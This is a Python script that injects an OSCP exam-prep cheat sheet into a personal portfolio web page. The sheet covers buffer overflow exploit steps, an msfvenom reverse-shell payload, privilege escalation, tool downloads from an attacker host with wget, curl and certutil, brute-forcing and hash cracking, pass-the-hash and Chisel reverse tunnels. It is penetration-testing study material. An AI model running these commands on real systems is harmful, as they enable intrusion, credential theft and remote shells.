import re
import os

html_path = r"d:\abdo_portfolio\main\templates\main\methodology.html"

with open(html_path, "r", encoding="utf-8") as f:
    content = f.read()

# Check if already injected
if 'cat-oscp' in content:
    print("Already injected.")
    exit(0)

sidebar_injection = """
      <!-- Category 6: OSCP MASTERCLASS -->
      <div class="sidebar-category">
        <div class="category-title" onclick="toggleCategory('cat-oscp')">
          <span>🛡️ OSCP MASTERCLASS</span>
          <span>▼</span>
        </div>
        <div class="category-items" id="cat-oscp" style="display: none;">
          <div class="meth-item" id="meth-ef-oscp_bof" onclick="openMethPhase('oscp_bof')" data-search="buffer overflow bof exploit development immunity mona">
            <span>├── 💥</span> <span>Buffer Overflow (25 Pts)</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_bof', '💥 Buffer Overflow')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-oscp_lpe" onclick="openMethPhase('oscp_lpe')" data-search="linux privilege escalation privesc root gtfobins suid">
            <span>├── 🐧</span> <span>Linux PrivEsc</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_lpe', '🐧 Linux PrivEsc')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-oscp_wpe" onclick="openMethPhase('oscp_wpe')" data-search="windows privilege escalation privesc system impersonation">
            <span>├── 🪟</span> <span>Windows PrivEsc</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_wpe', '🪟 Windows PrivEsc')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-oscp_nmap" onclick="openMethPhase('oscp_nmap')" data-search="nmap scanning enumeration ports smb snmp">
            <span>├── 📡</span> <span>Advanced Nmap Enum</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_nmap', '📡 Advanced Nmap Enum')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-oscp_xfer" onclick="openMethPhase('oscp_xfer')" data-search="file transfer certutil wget curl smbserver">
            <span>├── 📂</span> <span>File Transfers</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_xfer', '📂 File Transfers')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-oscp_pass" onclick="openMethPhase('oscp_pass')" data-search="password attacks cracking hydra hashcat pass the hash">
            <span>├── 🔑</span> <span>Password Attacks</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_pass', '🔑 Password Attacks')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-oscp_piv" onclick="openMethPhase('oscp_piv')" data-search="pivoting tunneling chisel socat proxychains">
            <span>├── 🚇</span> <span>Pivoting & Tunnels</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_piv', '🚇 Pivoting & Tunnels')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-oscp_strat" onclick="openMethPhase('oscp_strat')" data-search="report writing exam strategy time management metasploit">
            <span>└── 📝</span> <span>Strategy & Reporting</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_strat', '📝 Strategy & Reporting')">★</button>
          </div>
        </div>
      </div>
"""

# Inject into sidebar
content = content.replace('      <!-- Category 5: Hacker Scenarios -->', sidebar_injection + '\n      <!-- Category 5: Hacker Scenarios -->')


# HTML Content for phases
content_injection = """
      <!-- OSCP: Buffer Overflow -->
      <div class="meth-content-view" id="meth-content-oscp_bof" style="display: none; --tool-color: #ff0055;">
        <div class="phase-module-header">
          <div class="icon-wrapper">💥</div>
          <div class="header-text">
            <h2>Buffer Overflow & Exploit Dev (25 Pts)</h2>
            <p>The foundational memory corruption methodology required for the 25-point standalone machine.</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px; border-left: 3px solid #ff0055;">
          <div class="card-header"><h3 style="color:#ff0055;">8-Step BOF Methodology</h3></div>
          <p style="font-size:0.85rem; color:var(--text-secondary); margin-bottom: 10px;">Execute these exact steps sequentially using Immunity Debugger and Mona.py.</p>
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#00d9ff;">1. Fuzzing</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Send increasing increments of "A"s to find the crash point.</p>
              <div class="code-snippet">python fuzzer.py</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00d9ff;">2. Find Offset</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Generate cyclic pattern and locate exact EIP overwrite.</p>
              <div class="code-snippet">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
!mona findmsp -distance 3000</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00d9ff;">3. Control EIP</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Verify control by overwriting EIP with "B"s (\x42\x42\x42\x42).</p>
              <div class="code-snippet">payload = b"A" * offset + b"B" * 4 + b"C" * 400</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00d9ff;">4. Find Bad Characters</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Send \x00 to \xff. Compare ESP dump with Mona bytearray.</p>
              <div class="code-snippet">!mona bytearray -b "\\x00"
!mona compare -f C:\\mona\\bytearray.bin -a [ESP_ADDRESS]</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00d9ff;">5. Find JMP ESP</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Find a JMP ESP instruction in a DLL with ASLR/DEP disabled.</p>
              <div class="code-snippet">!mona jmp -r esp -cpb "\\x00\\x0a"</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00d9ff;">6. Generate Shellcode</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Generate reverse shell using msfvenom, excluding bad chars.</p>
              <div class="code-snippet">msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "\\x00\\x0a" -f c</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00d9ff;">7. Build Exploit</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Assemble the payload with NOP Sled (\x90) for stability.</p>
              <div class="code-snippet">payload = b"A" * offset + jmp_esp + b"\\x90" * 16 + shellcode</div>
            </div>
          </div>
        </div>
      </div>

      <!-- OSCP: Linux PrivEsc -->
      <div class="meth-content-view" id="meth-content-oscp_lpe" style="display: none; --tool-color: #00ff66;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🐧</div>
          <div class="header-text">
            <h2>Linux Privilege Escalation</h2>
            <p>Systematic methodology to escalate from a low-privileged shell to root.</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px;">
          <div class="card-header"><h3 style="color:#00d9ff;">Core Linux PrivEsc Vectors</h3></div>
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#00ff66;">1. Sudo Misconfigurations</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Check what you can run as root.</p>
              <div class="code-snippet">sudo -l</div>
              <p style="font-size:0.8rem; margin-top:5px; color:#ffb020;">Look up allowed binaries on GTFOBins. Check for CVE-2019-14287 (sudo -u#-1).</p>
            </div>
            <div class="cmd-card">
              <strong style="color:#00ff66;">2. SUID/SGID Binaries</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Find binaries running with owner's permissions (root).</p>
              <div class="code-snippet">find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00ff66;">3. Cron Jobs & Writable Paths</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Look for scripts running on a schedule that you can modify.</p>
              <div class="code-snippet">cat /etc/crontab
ls -la /etc/cron.*</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00ff66;">4. Capabilities</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Linux capabilities can bypass traditional permissions.</p>
              <div class="code-snippet">getcap -r / 2>/dev/null</div>
              <p style="font-size:0.8rem; margin-top:5px;">Look for `cap_setuid+ep` on python, perl, tar.</p>
            </div>
          </div>
        </div>
      </div>

      <!-- OSCP: Windows PrivEsc -->
      <div class="meth-content-view" id="meth-content-oscp_wpe" style="display: none; --tool-color: #00a8ff;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🪟</div>
          <div class="header-text">
            <h2>Windows Privilege Escalation</h2>
            <p>From local user to NT AUTHORITY\\SYSTEM.</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px; border-left: 3px solid #00a8ff;">
          <div class="card-header"><h3 style="color:#00a8ff;">Windows Attack Vectors</h3></div>
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#00a8ff;">1. Token Impersonation</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Exploit SeImpersonatePrivilege using Potato exploits.</p>
              <div class="code-snippet">whoami /priv
# If SeImpersonate is enabled:
PrintSpoofer64.exe -i -c cmd
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00a8ff;">2. Unquoted Service Paths & Weak Permissions</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Find services with paths containing spaces but no quotes.</p>
              <div class="code-snippet">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\" | findstr /i /v "\\"\\"\\""</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00a8ff;">3. Registry AutoRuns</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Check startup programs registry keys.</p>
              <div class="code-snippet">reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00a8ff;">4. Stored Credentials & GPP</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Search for cleartext passwords in configuration files.</p>
              <div class="code-snippet">findstr /si password *.txt *.xml *.ini
cmdkey /list</div>
            </div>
          </div>
        </div>
      </div>

      <!-- OSCP: Nmap & Enum -->
      <div class="meth-content-view" id="meth-content-oscp_nmap" style="display: none; --tool-color: #f59e0b;">
        <div class="phase-module-header">
          <div class="icon-wrapper">📡</div>
          <div class="header-text">
            <h2>Advanced Nmap & Network Enum</h2>
            <p>OSCP requires extreme thoroughness in enumeration. 80% of the exam is Enum.</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px;">
          <div class="card-header"><h3 style="color:#f59e0b;">The OSCP Two-Step Scan</h3></div>
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#00d9ff;">Step 1: All Ports (TCP)</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Find open ports quickly across all 65535 ports.</p>
              <div class="code-snippet">sudo nmap -p- -Pn --min-rate 1000 -vvv -oG openPorts [TARGET]</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00d9ff;">Step 2: Deep Scan</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Run default scripts (-sC) and version detection (-sV) on discovered ports.</p>
              <div class="code-snippet">nmap -p [PORTS] -sC -sV -O -oA full_scan [TARGET]</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00d9ff;">UDP Scanning</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Don't forget UDP! SNMP (161), TFTP (69), DNS (53) often hide vectors.</p>
              <div class="code-snippet">sudo nmap -sU -p 53,69,161,137,139 --top-ports 20 [TARGET]</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#00d9ff;">SMB & SNMP Enumeration</strong>
              <div class="code-snippet">smbclient -L //[TARGET] -N
enum4linux -a [TARGET]
snmpwalk -c public -v1 [TARGET]</div>
            </div>
          </div>
        </div>
      </div>

      <!-- OSCP: File Transfers -->
      <div class="meth-content-view" id="meth-content-oscp_xfer" style="display: none; --tool-color: #ff0055;">
        <div class="phase-module-header">
          <div class="icon-wrapper">📂</div>
          <div class="header-text">
            <h2>File Transfer Techniques</h2>
            <p>Moving exploits, linpeas/winpeas, and files to the target.</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px; border-left: 3px solid #ff0055;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#ff0055;">Attacker Server (Kali)</strong>
              <div class="code-snippet">python3 -m http.server 80
# SMB Server for Windows targets
sudo impacket-smbserver share `pwd` -smb2support</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#ff0055;">Linux Targets</strong>
              <div class="code-snippet">wget http://[KALI]/linpeas.sh -O /tmp/linpeas.sh
curl http://[KALI]/linpeas.sh -o /tmp/linpeas.sh
nc -nv [KALI] 4444 > file.txt</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#ff0055;">Windows Targets</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Certutil is highly reliable on Windows.</p>
              <div class="code-snippet">certutil.exe -urlcache -split -f http://[KALI]/winpeas.exe C:\\Temp\\winpeas.exe
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://[KALI]/file', 'C:\\Temp\\file')"
copy \\\\[KALI]\\share\\winpeas.exe C:\\Temp\\winpeas.exe</div>
            </div>
          </div>
        </div>
      </div>

      <!-- OSCP: Password Attacks -->
      <div class="meth-content-view" id="meth-content-oscp_pass" style="display: none; --tool-color: #9b59ff;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🔑</div>
          <div class="header-text">
            <h2>Password Attacks & Cracking</h2>
            <p>Cracking hashes and brute-forcing services.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#9b59ff;">Hydra (Online Brute-force)</strong>
              <div class="code-snippet">hydra -l admin -P rockyou.txt ssh://[TARGET]
hydra -L users.txt -p Password123 rdp://[TARGET]</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#9b59ff;">Hashcat (GPU Cracking)</strong>
              <div class="code-snippet">hashcat -m 1000 hashes.txt rockyou.txt  # NTLM
hashcat -m 1800 hashes.txt rockyou.txt  # SHA-512 (Linux shadow)
hashcat -m 5600 hashes.txt rockyou.txt  # NetNTLMv2</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#9b59ff;">Pass The Hash (PTH)</strong>
              <p style="font-size:0.8rem; margin:5px 0;">If you have the NTLM hash, you don't need to crack it.</p>
              <div class="code-snippet">impacket-psexec Administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH</div>
            </div>
          </div>
        </div>
      </div>

      <!-- OSCP: Pivoting -->
      <div class="meth-content-view" id="meth-content-oscp_piv" style="display: none; --tool-color: #14b8a6;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🚇</div>
          <div class="header-text">
            <h2>Pivoting & Tunneling</h2>
            <p>Accessing internal networks via compromised hosts.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#14b8a6;">Chisel (Reverse SOCKS5 Proxy)</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Most reliable OSCP tunneling method.</p>
              <div class="code-snippet"># On Kali (Server)
chisel server -p 8000 --reverse

# On Target (Client)
chisel client [KALI_IP]:8000 R:socks</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#14b8a6;">Proxychains</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Edit `/etc/proxychains.conf` (socks5 127.0.0.1 1080)</p>
              <div class="code-snippet">proxychains nmap -sT -Pn -p 445 [INTERNAL_IP]
proxychains impacket-smbexec user@172.16.0.5</div>
            </div>
            <div class="cmd-card">
              <strong style="color:#14b8a6;">SSH Local Port Forwarding</strong>
              <div class="code-snippet">ssh -L 8080:127.0.0.1:80 user@[TARGET]</div>
            </div>
          </div>
        </div>
      </div>

      <!-- OSCP: Strategy -->
      <div class="meth-content-view" id="meth-content-oscp_strat" style="display: none; --tool-color: #ffb020;">
        <div class="phase-module-header">
          <div class="icon-wrapper">📝</div>
          <div class="header-text">
            <h2>Exam Strategy & Report Writing</h2>
            <p>Crucial administrative and tactical requirements to avoid failing.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#ffb020;">1. Documentation is Everything</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Take full desktop screenshots showing the `ipconfig/ifconfig`, the `local.txt/proof.txt` contents, and the terminal.</p>
            </div>
            <div class="cmd-card">
              <strong style="color:#ffb020;">2. Metasploit Rules</strong>
              <p style="font-size:0.8rem; margin:5px 0;">You can only use Metasploit (exploit modules/meterpreter) against ONE single target. MSFvenom is unlimited.</p>
            </div>
            <div class="cmd-card">
              <strong style="color:#ffb020;">3. Time Management</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Don't spend more than 2 hours on a rabbit hole. Enumerate -> Exploit -> Fail -> Re-Enumerate.</p>
            </div>
            <div class="cmd-card">
              <strong style="color:#ffb020;">4. AD Points (40 Pts)</strong>
              <p style="font-size:0.8rem; margin:5px 0;">If you compromise the Domain Controller, you get 40 points. Standalone machines are 20 pts each. Target the AD set early.</p>
            </div>
          </div>
        </div>
      </div>
"""

# Inject main content right before the very last </div> closing the meth-container
idx = content.rfind('</div>\n  </main>')
if idx != -1:
    content = content[:idx] + content_injection + content[idx:]

with open(html_path, "w", encoding="utf-8") as f:
    f.write(content)

print("Injected OSCP modules successfully.")
